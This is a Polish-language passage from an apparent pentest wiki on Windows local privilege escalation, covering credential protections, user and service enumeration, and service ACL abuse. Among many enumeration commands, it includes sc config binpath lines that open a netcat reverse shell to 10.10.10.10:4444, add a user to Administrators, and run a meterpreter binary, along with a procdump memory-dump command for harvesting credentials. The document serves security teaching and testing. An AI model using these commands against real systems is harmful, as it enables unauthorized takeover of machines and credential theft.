**LAPS** służy do **zarządzania hasłami lokalnych kont Administratora**, zapewniając, że każde hasło jest **unikatowe, losowe i regularnie zmieniane** na komputerach dołączonych do domeny. Hasła te są bezpiecznie przechowywane w Active Directory i mogą uzyskać do nich dostęp wyłącznie użytkownicy, którym przyznano odpowiednie uprawnienia za pomocą ACL, umożliwiające im wyświetlanie lokalnych haseł administratora.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Jeśli ta funkcja jest aktywna, **hasła w postaci jawnego tekstu są przechowywane w LSASS** (Local Security Authority Subsystem Service).\
[**Więcej informacji o WDigest na tej stronie**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Ochrona LSA

Począwszy od **Windows 8.1**, firma Microsoft wprowadziła ulepszoną ochronę Lokalnego Urzędu Zabezpieczeń (LSA), aby **blokować** próby **odczytu jego pamięci** lub wstrzykiwania kodu przez niezaufane procesy, dodatkowo zabezpieczając system.\
[**Więcej informacji o ochronie LSA znajdziesz tutaj**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credential Guard

**Credential Guard** został wprowadzony w **Windows 10**. Jego celem jest ochrona poświadczeń przechowywanych na urządzeniu przed zagrożeniami, takimi jak ataki pass-the-hash. [**Więcej informacji o Credential Guard znajdziesz tutaj.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Buforowane poświadczenia

**Poświadczenia domenowe** są uwierzytelniane przez **Local Security Authority** (LSA) i wykorzystywane przez składniki systemu operacyjnego. Gdy dane logowania użytkownika zostaną uwierzytelnione przez zarejestrowany pakiet zabezpieczeń, zwykle zostają ustanowione poświadczenia domenowe tego użytkownika.\
[**Więcej informacji o buforowanych poświadczeniach**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Użytkownicy i grupy

### Enumerowanie użytkowników i grup

Sprawdź, czy którakolwiek z grup, do których należysz, ma interesujące uprawnienia.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Grupy uprzywilejowane

Jeśli **należysz do jakiejś uprzywilejowanej grupy, możesz być w stanie eskalować uprawnienia**. Dowiedz się więcej o uprzywilejowanych grupach i o tym, jak wykorzystać je do eskalacji uprawnień:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulowanie tokenami

**Dowiedz się więcej** o tym, czym jest **token**, na tej stronie: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sprawdź następującą stronę, aby **dowiedzieć się więcej o interesujących tokenach** i o tym, jak je wykorzystać:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Zalogowani użytkownicy / sesje

```bash
qwinsta
klist sessions
```

### Katalogi domowe

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Zasady haseł

```bash
net accounts
```

### Uzyskaj zawartość schowka

```bash
powershell -command "Get-Clipboard"
```

## Uruchomione procesy

### Uprawnienia do plików i folderów

Przede wszystkim, podczas wyświetlania procesów **sprawdź, czy w wierszu poleceń procesu nie ma haseł**.\
Sprawdź, czy możesz **nadpisać jakiś uruchomiony plik binarny** lub czy masz uprawnienia do zapisu w folderze z plikiem binarnym, aby wykorzystać potencjalne [**ataki DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Zawsze sprawdzaj, czy nie działają [**debuggery electron/cef/chromium**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) — można je wykorzystać do eskalacji uprawnień.

Listener debuggera może działać krótko, więc jego brak w pojedynczym pasywnym zrzucie portów nie dowodzi, że nigdy nie był dostępny. Powiąż każdy zaobserwowany listener z jego PID-em, właścicielem procesu i możliwością uzyskania do niego dostępu przez użytkownika o niższych uprawnieniach; sama nazwa aplikacji lub flaga debugowania nie potwierdza możliwości wykonania kodu między użytkownikami. Rutynową enumerację prowadź pasywnie — nie wysyłaj poleceń do debuggera.

**Sprawdzanie uprawnień do plików binarnych procesów**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Sprawdzanie uprawnień do folderów z plikami binarnymi procesów (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Katalogi dynamicznych preprocesorów Snort

Snort 2 może ładować biblioteki współdzielone z katalogu `dynamicpreprocessor directory` zadeklarowanego w konfiguracji wybranej za pomocą `snort.exe -c <config>`. W przypadku zaplanowanego zadania lub usługi uruchamiającej Snort na innym koncie sprawdź dokładnie tę konfigurację i ACL zadeklarowanego katalogu modułów. Jeśli Twój token pozwala tworzyć tam pliki, ścieżka ta jest kandydatem do dalszej analizy pod kątem wykonania kodu przy następnym ładowaniu modułów przez to zadanie lub usługę. Zweryfikuj efektywne uprawnienia konta uruchamiającego proces, aktywną konfigurację, zgodność modułów oraz wszelkie ograniczenia typu deny lub ograniczenia udziału; sam zapis do katalogu nie dowodzi eskalacji uprawnień. [Dokumentacja dynamicznych preprocesorów Snort](https://www.snort.org/documents/dpx-readme) opisuje ładowanie modułów w czasie działania.

### Uprzywilejowana usługa sieci Web z zapisywalnym katalogiem dokumentów

W instalacji Apache w systemie Windows porównaj ścieżkę do pliku wykonywalnego usługi i konto, na którym jest uruchamiana, z wartością `DocumentRoot` w aktywnym pliku `httpd.conf`. W typowym układzie XAMPP sprawdź `C:\xampp\apache\conf\httpd.conf` oraz ACL skonfigurowanego katalogu dokumentów, często `C:\xampp\htdocs`. Jeśli użytkownik z niższymi uprawnieniami może tworzyć pliki w tym katalogu, gdy Apache działa jako `LocalSystem`, wykonanie kodu po stronie serwera może przekroczyć granicę uprawnień hosta. Potwierdź, że usługa działa, że udostępniana jest dokładnie ta ścieżka oraz że handler po stronie serwera przetwarza dany typ pliku; sam zapis do katalogu dowodzi jedynie możliwości tworzenia plików. Sprawdź ACL bez zapisywania pliku testowego:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

W przypadku standardowej instalacji WAMP usługa może wskazywać na wersjonowany plik `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (lub `C:\wamp\...` w układzie 32-bitowym), a konfiguracja znajduje się obok, w `conf\httpd.conf`; domyślnym katalogiem głównym może być `C:\wamp64\www` lub `C:\wamp\www`. Sprawdź łącznie dokładną ścieżkę obrazu usługi, konto, na którym działa, efektywną wartość `DocumentRoot` (uwzględniając rozwinięcie `${INSTALL_DIR}` i nadpisania wirtualnych hostów) oraz ACL katalogu głównego. Katalog WAMP z prawem zapisu nie dowodzi, że Apache działa jako `SYSTEM` ani że wykona przesłany plik. [Dokumentacja Apache wyjaśnia, jak usługa Windows wybiera konfigurację](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Zapisywalny katalog główny IIS i tożsamość puli aplikacji w sieci

W IIS przyporządkuj zapisywalny katalog fizyczny aktywnej witrynie lub aplikacji w `applicationHost.config`, a następnie ustal skonfigurowaną pulę i handler po stronie serwera. Kod umieszczony w katalogu udostępnianym przez serwer działa jako pula tylko wtedy, gdy IIS przetwarza dany typ pliku, a ścieżka jest osiągalna. Zanim uznasz zapisywalny katalog za możliwość wykonania kodu, sprawdź efektywne uprawnienia bieżącego użytkownika do tworzenia plików, stan witryny, handler i nadpisania ustawień dla danej ścieżki.

Dynamiczna kompilacja ASP.NET to osobna ścieżka wymagająca sprawdzenia: wygenerowane pliki w katalogu kompilacji aplikacji. Domyślnie jest to katalog `Temporary ASP.NET Files` w odpowiedniej instalacji .NET Framework, ale ustawienie `<compilation tempDirectory>` aplikacji może zmienić tę lokalizację. [Microsoft dokumentuje lokalizację i podkatalogi poszczególnych aplikacji](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) oraz [zaleca izolowanie katalogów kompilacji, gdy pule aplikacji nie ufają sobie nawzajem](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Jeśli token o niższych uprawnieniach pozwala zmieniać wygenerowany kod źródłowy w pamięci podręcznej **konkretnej** aplikacji, ustal, czy aplikacja ponownie go kompiluje z uprawnieniami bardziej uprzywilejowanej [tożsamości procesu roboczego](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Sama lista ACL pliku lub katalogu nie dowodzi możliwości wykonania kodu: sprawdź powiązanie pamięci podręcznej z aktywną aplikacją, efektywny token i ACL, ustawienia kompilacji, tożsamość procesu oraz moment ewentualnej ponownej kompilacji. Korzystaj z przeglądu metadanych tylko do odczytu; podczas enumeracji nie wywołuj kompilacji ani nie zmieniaj plików w pamięci podręcznej.

Pula IIS skonfigurowana jako `ApplicationPoolIdentity` lub `NetworkService` zwykle uwierzytelnia się w zasobach domenowych jako **konto komputera hosta**, mimo że jej lokalny token może mieć niskie uprawnienia. `LocalSystem` ma już wysokie uprawnienia lokalne i również używa konta komputera w sieci; `LocalService` zwykle używa anonimowych poświadczeń sieciowych. Pula `SpecificUser` korzysta z przypisanego jej konta. [Microsoft opisuje te typy tożsamości](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) i [tożsamość puli aplikacji w sieci](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Pominięte ustawienie tożsamości może dziedziczyć wartości domyślne puli, które różnią się w zależności od wersji IIS, dlatego ustal efektywną konfigurację zamiast zgadywać na podstawie nazwy puli. Jeśli wykonanie kodu odbywa się w puli używającej w sieci tożsamości konta komputera, sprawdź uprawnienia katalogowe **tego konkretnego komputera**. [DCSync](../active-directory-methodology/dcsync.md) wymaga uprawnień replikacji w kontekście nazewniczym domeny; sam bilet konta komputera lub rola hosta nie potwierdzają ich posiadania. Pasywna enumeracja powinna obejmować sprawdzenie konfiguracji i ACL bez przesyłania pliku, nawiązywania uwierzytelnienia sieciowego ani żądania biletów.

W przypadku czytelnego handlera ASP.NET, który uruchamia proces pomocniczy, prześledź każdą wartość pochodzącą z żądania przez uwierzytelnianie, deszyfrowanie, walidację i budowanie polecenia. Handler, który łączy zdekodowany token z `ProcessStartInfo("cmd", "/c ...")`, może umożliwić metaznakom powłoki zmianę polecenia; [Microsoft opisuje znaki specjalne `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Ustal, czy niezaufany użytkownik może rzeczywiście wpłynąć na zdekodowaną wartość i dotrzeć do handlera, a następnie sprawdź efektywną tożsamość puli aplikacji lub impersonowanego użytkownika oraz tożsamość procesu potomnego. Czytelna linia kodu źródłowego, nasłuchujący port localhost ani słabość formatu tokena same w sobie nie dowodzą możliwości wykonania uprzywilejowanych poleceń. Przeglądaj kod źródłowy i konfigurację puli bez wysyłania spreparowanych żądań ani uruchamiania procesu pomocniczego podczas pasywnej enumeracji.

W przypadku usługi PHP w systemie Windows ścieżka kontrolowana przez żądanie, przekazana do [`include` lub `require`](https://www.php.net/manual/en/function.include.php), może spowodować wykonanie pliku PHP, który użytkownik o niższych uprawnieniach może modyfikować, z uprawnieniami procesu roboczego. Potwierdź, że żądanie może dotrzeć do tej instrukcji, ustalona ścieżka wskazuje plik, który użytkownik o niższych uprawnieniach może modyfikować, a proces roboczy odczytywać, obowiązujące ograniczenia ścieżek PHP pozwalają na dołączenie pliku, a proces roboczy rzeczywiście działa z wyższymi uprawnieniami. Sam nasłuchujący port loopback ani zapisywalny plik nie potwierdzają takiego łańcucha; podczas pasywnej enumeracji sprawdź kod źródłowy, tożsamość usługi i ACL plików, nie wywołując punktu końcowego.

### Wydobywanie haseł z pamięci

Możesz utworzyć zrzut pamięci działającego procesu za pomocą **procdump** z pakietu sysinternals. Usługi takie jak FTP przechowują **poświadczenia w pamięci jawnym tekstem**; spróbuj zrzucić pamięć i odczytać poświadczenia.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Niezabezpieczone aplikacje GUI

**Aplikacje uruchomione jako SYSTEM mogą umożliwiać użytkownikowi uruchomienie CMD lub przeglądanie katalogów.**

Przykład: „Windows Help and Support” (Windows + F1), wyszukaj „command prompt”, kliknij „Click to open Command Prompt”

### Import plików projektów z podwyższonymi uprawnieniami

Aplikacja, która automatycznie otwiera projekty z katalogu drop, do którego zapis może uzyskać użytkownik o niższych uprawnieniach, przekracza granicę zaufania danych wejściowych, działając na koncie importującego. Sprawdź **dokładną ścieżkę z prawem zapisu**, proces lub zadanie, które ją otwiera, jego efektywną tożsamość oraz wersję parsera. [Historyczny problem z otwieraniem/przywracaniem projektów Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) pozwalał na użycie zewnętrznych encji XML w metadanych projektu; encja sieciowa w systemie Windows mogła spowodować uwierzytelnienie z konta importującego, jeśli pozwalały na to [zasady dotyczące ruchu wychodzącego SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). To wskazówka dotycząca ujawnienia poświadczeń, a nie natychmiastowego uzyskania dostępu administratora: odpowiedź musi nadawać się do wykorzystania przez osobną, autoryzowaną lub podatną ścieżkę, a bieżące kompilacje należy oceniać pod kątem ich rzeczywistego stanu poprawek. Podczas pasywnego rozpoznania nie otwieraj spreparowanego projektu; sprawdź przepływ importu i ACL.

## Usługi

Prawo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) do obiektu Service Control Manager (SCM) jest niezależne od praw do istniejącej usługi. Pomyślne, tylko do odczytu żądanie dostępu [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) z tym prawem jest wskazówką do dalszej analizy, a nie dowodem, że nowa usługa może zostać uruchomiona. [`CreateService` zwraca uchwyt](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) z prawami dostępu do usługi żądanymi w chwili jej tworzenia; późniejsze ponowne otwarcie usługi powoduje osobną kontrolę dostępu i może się nie powieść, nawet jeśli można użyć pierwotnego uchwytu. Osobno zweryfikuj efektywny token lokalny lub zdalny, przyznane prawa uchwytu, konto usługi, zasady uruchamiania i ścieżkę pliku wykonywalnego. Podczas pasywnego rozpoznania nie twórz ani nie uruchamiaj usługi.

W przypadku zdalnej ścieżki instalacji usługi powiąż te prawa SCM z udziałem na celu, do którego zapisu może dokonać **to samo logowanie sieciowe**, bazową listą ACL NTFS tego udziału oraz lokalną ścieżką pliku wykonywalnego, który może uruchomić konto usługi. Konto niebędące administratorem może przekroczyć tę granicę, jeśli istnieją wyjątkowo szerokie prawa SCM i ścieżka umieszczenia pliku; udział administracyjny nie jest warunkiem koniecznym. Sam dostęp do zapisu w udziale lub sama wskazówka dotycząca prawa SCM do tworzenia usługi nie dowodzą, że nowa usługa może zostać uruchomiona z wyższą tożsamością.

Istniejąca usługa może wywoływać pomocniczy plik wykonywalny podczas uruchamiania, zamykania lub innego zdarzenia cyklu życia, nawet jeśli tego pliku nie ma w jej `ImagePath`. Jeśli nazwa pomocniczego pliku jest rozwiązywana do katalogu, do którego zapis może uzyskać użytkownik o niższych uprawnieniach, a usługa działa z wyższą tożsamością, brakujący plik pomocniczy może być potencjalnym celem podmiany, zależnie od warunków. Potwierdź **rzeczywisty kod usługi lub udokumentowane wywołanie pomocniczego pliku**, rozwiązaną ścieżkę pliku wykonywalnego i kolejność wyszukiwania, prawa do tworzenia katalogu, tożsamość usługi oraz dostępny wyzwalacz cyklu życia. Sam katalog usługi z prawem zapisu lub brakujący plik nie dowodzą, że usługa go załaduje; podczas pasywnego przeglądu nie uruchamiaj ani nie zatrzymuj usługi.

W przypadku istniejącej usługi [`SERVICE_START` pozwala przekazać argumenty do `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); jest to inne prawo niż [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Zanim uznasz prawo do uruchomienia za coś więcej niż prawo do sterowania, sprawdź kod usługi lub jej udokumentowany interfejs. Jeśli usługa używa argumentu wybranego przez wywołującego jako ścieżki dziennika lub eksportu, zweryfikuj tożsamość usługi, dokładny przepływ od argumentu do zapisu, ograniczenia ścieżki oraz uprawnienia do **utworzonego pliku**. Zapis w chronionym katalogu może prowadzić do eskalacji tylko wtedy, gdy istnieje osobny uprzywilejowany konsument lub moduł ładujący, który akceptuje ten plik; sam zapisywalny dziennik lub prawo do uruchomienia nie wystarczają. Podczas pasywnej inwentaryzacji nie uruchamiaj usługi ani nie twórz pliku testowego.

W przypadku agenta monitorującego NSClient++ dostępny do odczytu `nsclient.ini` jest **wskazówką do przeglądu konfiguracji**: może zawierać poświadczenia do interfejsu webowego, a `boot.ini` może przekierowywać konfigurację do innej lokalizacji. Sprawdź rzeczywiste konto usługi, nasłuchujący interfejs WEB i zasady dostępu oraz to, czy uwierzytelniona rola może zmieniać ustawienia lub skrypty. Do uprzywilejowanego wykonania potrzebne są dodatkowo `CheckExternalScripts` (lub inna włączona ścieżka wykonania), efektywne prawo do zarejestrowania lub zmodyfikowania polecenia oraz wyzwalacz uruchamiający je z tożsamością usługi. Interfejs nasłuchujący wyłącznie na loopback nadal może być osiągalny dla użytkownika lokalnego, ale sama ścieżka pliku, hasło lub interfejs nasłuchujący nie potwierdzają tych uprawnień. Podczas pasywnego rozpoznania sprawdzaj metadane i uprawnienia bez wyświetlania sekretów ani wywoływania API webowego. Zobacz [układ plików NSClient++](https://nsclient.org/docs/concepts/file-layout/), [wskazówki dotyczące zabezpieczania interfejsu webowego i skryptów](https://nsclient.org/docs/setup/securing/) oraz [konfigurację skryptów zewnętrznych](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

W przypadku usługi, której `ImagePath` wskazuje `nssm.exe`, sprawdź rzeczywiste konto, na którym działa usługa, oraz jej wartość `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM przechowuje tam aplikację potomną](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), a `AppDirectory` to skonfigurowany katalog roboczy. Zanim uznasz uprawnienia wrappera za pełny obraz granicy bezpieczeństwa usługi, sprawdź plik wykonywalny aplikacji potomnej i ACL jej katalogu nadrzędnego. Lokalny endpoint WCF lub SOAP udostępniony przez tę aplikację to osobna wskazówka do dalszej analizy: potwierdź, że użytkownik o niższych uprawnieniach może połączyć się z nasłuchującym endpointem, że dokładna operacja akceptuje jego dane wejściowe oraz że proces potomny usługi wykonuje niebezpieczną operację z wyższą tożsamością. Konto usługi, adres URL endpointu ani ścieżka z prawem zapisu nie dowodzą same w sobie możliwości eskalacji; podczas pasywnego rozpoznania nie wywołuj operacji usługi.

W przypadku niestandardowej operacji WCF prześledź przepływ ciągu znaków kontrolowanego przez wywołującego do dowolnego runspace PowerShell. [`Pipeline.Commands.AddScript` dodaje tekst skryptu](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), a [`Pipeline.Invoke` uruchamia pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` z poświadczeniami transportowymi Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) uwierzytelnia klienta, ale uprawnienia do wywołania tej **konkretnej** operacji oraz efektywna tożsamość runspace muszą zostać sprawdzone osobno. Ścieżka od danych wejściowych użytkownika o niższych uprawnieniach do `AddScript` działającego z wyższą tożsamością usługi stanowi granicę wykonania kodu; sam nasłuchujący port, uwierzytelniony klient lub nieużywana metoda w niepowiązanym zestawie nie są dowodem. Podczas rozpoznania sprawdź statycznie wdrożoną usługę, kontrakt, autoryzację i ustawienia personifikacji, nie wywołując endpointu.

Wyzwalacze usług pozwalają systemowi Windows uruchomić usługę po wystąpieniu określonych warunków (aktywność nazwanego potoku/endpointu RPC, zdarzenia ETW, dostępność adresu IP, podłączenie urządzenia, odświeżenie GPO itp.). Nawet bez prawa SERVICE_START często można uruchomić uprzywilejowane usługi, wywołując ich wyzwalacze. Techniki enumeracji i aktywacji znajdziesz tutaj:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Usługa Visual Studio diagnostic collector

Instalacje Visual Studio z narzędziami C/C++ mogą zawierać `VSStandardCollectorService150` — usługę diagnostyczną skonfigurowaną do działania jako `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) wykorzystywało junction i wyścig object-manager-link, aby przekierować reset DACL usługi. Wykazana eskalacja wymagała również dostępnej ścieżki naprawy MSI dostawcy WMI programu Visual Studio Setup oraz pliku docelowego `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Ten komponent naprawiono w styczniu 2024 r.

Podczas pasywnej wstępnej analizy sprawdź konto i ścieżkę pliku binarnego tej usługi, ustal, czy istnieje ścieżka kompilatora WMI Setup, oraz zweryfikuj stan poprawek zainstalowanego komponentu. Sam wpis usługi, wersja produktu Visual Studio ani plik kompilatora nie dowodzą, że host jest podatny. Kontrola nie wymaga uruchomienia usługi ani wykonania naprawy.

Uzyskaj listę usług:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Uprawnienia

Możesz użyć **sc**, aby uzyskać informacje o usłudze.

```bash
sc qc <service_name>
```

Zaleca się posiadanie pliku binarnego **accesschk** z pakietu _Sysinternals_, aby sprawdzić wymagany poziom uprawnień dla każdej usługi.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Zaleca się sprawdzić, czy „Authenticated Users” mogą modyfikować jakąkolwiek usługę:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Możesz pobrać accesschk.exe dla XP stąd](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Włącz usługę

Jeśli pojawia się ten błąd (na przykład w przypadku SSDPSRV):

_Błąd systemu 1058._\
_Usługi nie można uruchomić, ponieważ jest wyłączona lub nie ma włączonych urządzeń z nią powiązanych._

Możesz ją włączyć za pomocą

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Należy wziąć pod uwagę, że usługa upnphost wymaga do działania SSDPSRV (w przypadku XP SP1)**

**Innym obejściem tego problemu** jest uruchomienie:

```
sc.exe config usosvc start= auto
```

### **Modyfikowanie ścieżki pliku binarnego usługi**

W scenariuszu, w którym grupa „Użytkownicy uwierzytelnieni” ma uprawnienie **SERVICE_ALL_ACCESS** do usługi, możliwa jest modyfikacja pliku binarnego wykonywalnego usługi. Aby zmodyfikować i uruchomić **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Ponowne uruchomienie usługi

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Uprawnienia można eskalować za pomocą różnych uprawnień:

- **SERVICE_CHANGE_CONFIG**: Umożliwia ponowną konfigurację pliku binarnego usługi.
- **WRITE_DAC**: Umożliwia ponowną konfigurację uprawnień, co pozwala zmieniać konfigurację usługi.
- **WRITE_OWNER**: Umożliwia przejęcie własności i ponowną konfigurację uprawnień.
- **GENERIC_WRITE**: Zapewnia również możliwość zmiany konfiguracji usługi.
- **GENERIC_ALL**: Również zapewnia możliwość zmiany konfiguracji usługi.

Do wykrywania i wykorzystania tej podatności można użyć _exploit/windows/local/service_permissions_.

### Słabe uprawnienia do plików binarnych usług

Jeśli usługa działa jako **`LocalSystem`**, **`LocalService`**, **`NetworkService`** lub uprzywilejowane konto domenowe, ale **użytkownicy z niskimi uprawnieniami mogą modyfikować plik EXE usługi lub jego folder nadrzędny**, często można przejąć kontrolę nad usługą, **podmieniając plik binarny i ponownie uruchamiając usługę**.

**Sprawdź, czy możesz zmodyfikować plik binarny uruchamiany przez usługę** lub czy masz **uprawnienia do zapisu w folderze**, w którym znajduje się plik binarny ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Za pomocą **wmic** (nie w system32) możesz pobrać listę wszystkich plików binarnych uruchamianych przez usługi, a następnie sprawdzić swoje uprawnienia za pomocą **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Możesz także użyć **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Szukaj niebezpiecznych ACL-i przyznanych **`Everyone`**, **`BUILTIN\Users`** lub **`Authenticated Users`**, a zwłaszcza uprawnień **`(F)`**, **`(M)`** lub **`(W)`** do pliku wykonywalnego usługi albo katalogu, w którym się znajduje. Praktyczny scenariusz nadużycia:<sup>[[27]](#references)</sup>

1. Sprawdź konto usługi i ścieżkę do pliku wykonywalnego poleceniem `sc qc <service_name>`.
2. Sprawdź, czy plik binarny jest zapisywalny, poleceniem `icacls <path>`.
3. Zastąp plik binarny payloadem lub prawidłowym, złośliwym plikiem binarnym usługi.
4. Uruchom ponownie usługę poleceniem `sc stop <service_name> && sc start <service_name>` (lub zaczekaj na ponowne uruchomienie systemu albo wyzwolenie usługi).

Przydatne zautomatyzowane kontrole:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Jeśli usługa nie pozwala zwykłemu użytkownikowi na jej ponowne uruchomienie, sprawdź, czy uruchamia się automatycznie podczas rozruchu, ma akcję w przypadku awarii, która uruchamia ją ponownie, lub może zostać uruchomiona pośrednio przez aplikację, która z niej korzysta.

### Uprawnienia do modyfikacji rejestru usług

Sprawdź, czy możesz zmodyfikować klucz rejestru dowolnej usługi.\
Możesz **sprawdzić** swoje **uprawnienia** do klucza **rejestru** usługi, wykonując:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Sprawdź, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** mają uprawnienia do zapisu w kluczu rejestru określonej usługi. Sam wpis ACL nie dowodzi, że dostęp jest faktycznie możliwy — znaczenie mają wpisy odmawiające dostępu, bieżący token oraz uprawnienia dziedziczone. Uprawnienia do klucza rejestru są niezależne od uprawnień `SERVICE_CHANGE_CONFIG` i `SERVICE_START` obiektu usługi. Eskalacja wymaga również użytecznego pola konfiguracji usługi, możliwości jej uruchomienia oraz tożsamości usługi o wyższych uprawnieniach. Zobacz dokumentację Microsoft dotyczącą [uprawnień do kluczy rejestru](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) oraz [uprawnień dostępu do usług](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

